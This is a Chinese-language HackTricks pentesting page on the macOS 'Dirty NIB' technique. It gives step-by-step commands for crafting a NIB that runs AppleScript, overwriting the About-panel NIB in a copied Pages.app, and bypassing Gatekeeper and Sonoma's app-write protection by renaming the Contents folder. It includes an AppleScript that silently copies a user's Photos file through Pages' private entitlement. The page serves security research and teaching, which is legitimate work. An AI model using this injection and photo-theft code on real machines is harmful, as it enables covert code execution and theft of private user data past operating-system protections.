# macOS脏NIB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

**这个技术是从这篇文章中获取的** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)

## 基本信息

NIB文件在Apple的开发生态系统中用于**定义用户界面（UI）元素**及其在应用程序中的交互。使用Interface Builder工具创建，它们包含像窗口、按钮和文本字段这样的**序列化对象**，在运行时加载以呈现设计的UI。尽管仍在使用中，但Apple已经开始推荐使用Storyboards来更直观地表示应用程序的UI流程。

{% hint style="danger" %}
此外，**NIB文件**还可以用于**运行任意命令**，如果在应用程序中修改了NIB文件，**Gatekeeper仍然允许执行该应用程序**，因此可以用于在应用程序内部运行任意命令。
{% endhint %}

## 脏NIB注入 <a href="#dirtynib" id="dirtynib"></a>

首先，我们需要创建一个新的NIB文件，我们将使用XCode进行大部分构建工作。我们首先向界面添加一个对象，并将类设置为NSAppleScript：

<figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>

对于这个对象，我们需要设置初始的`source`属性，我们可以使用用户定义的运行时属性来完成：

<figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>

这样设置了我们的代码执行工具，它只会在请求时**运行AppleScript**。为了触发AppleScript的执行，我们现在只需添加一个按钮（当然你也可以在此基础上进行创意；）。按钮将绑定到我们刚刚创建的`Apple Script`对象，并将调用`executeAndReturnError:`选择器：

<figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>

为了测试，我们将使用以下Apple Script：
```bash
set theDialogText to "PWND"
display dialog theDialogText
```
如果我们在XCode调试器中运行这个并点击按钮：

<figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>

通过从NIB执行任意AppleScript代码的能力，我们接下来需要一个目标。让我们选择Pages作为我们的初始演示，这当然是一个苹果应用程序，我们肯定不能修改它。

我们首先将应用程序的副本复制到`/tmp/`目录中：
```bash
cp -a -X /Applications/Pages.app /tmp/
```
然后我们将启动应用程序，以避免任何Gatekeeper问题，并允许缓存事物：
```bash
open -W -g -j /Applications/Pages.app
```
在第一次启动（和终止）应用程序后，我们需要用我们的DirtyNIB文件覆盖现有的NIB文件。为了演示目的，我们将只覆盖关于面板的NIB文件，以便我们可以控制执行：
```bash
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```
一旦我们覆盖了nib文件，我们可以通过选择“关于”菜单项来触发执行：

<figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>

如果我们仔细查看Pages，我们会发现它有一个私有的权限，允许访问用户的照片：

<figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>

因此，我们可以通过**修改我们的AppleScript来窃取用户的照片**，而无需提示：

{% code overflow="wrap" %}
```applescript
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```
{% endcode %}

{% hint style="danger" %}
[**恶意的.xib文件执行任意代码示例**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
{% endhint %}

## 启动限制

它们基本上**防止在预期位置之外执行应用程序**，因此，如果您将受到启动限制保护的应用程序复制到`/tmp`，您将无法执行它。\
[**在此帖子中查找更多信息**](../macos-security-protections/#launch-constraints)**。**

然而，通过解析文件**`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`**，您仍然可以找到**未受启动限制保护的应用程序**，因此仍然可以将**NIB**文件注入到**这些应用程序**的任意位置（请查看上面的链接以了解如何找到这些应用程序）。

## 额外保护

从macOS Somona开始，有一些保护措施**防止在应用程序内部写入**。然而，如果在运行二进制文件的副本之前，您更改了Contents文件夹的名称，仍然可以绕过此保护：

1. 将`CarPlay Simulator.app`的副本复制到`/tmp/`
2. 将`/tmp/Carplay Simulator.app/Contents`重命名为`/tmp/CarPlay Simulator.app/NotCon`
3. 启动二进制文件`/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator`以在Gatekeeper中缓存
4. 使用我们的`Dirty.nib`文件覆盖`NotCon/Resources/Base.lproj/MainMenu.nib`
5. 重命名为`/tmp/CarPlay Simulator.app/Contents`
6. 再次启动`CarPlay Simulator.app`

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
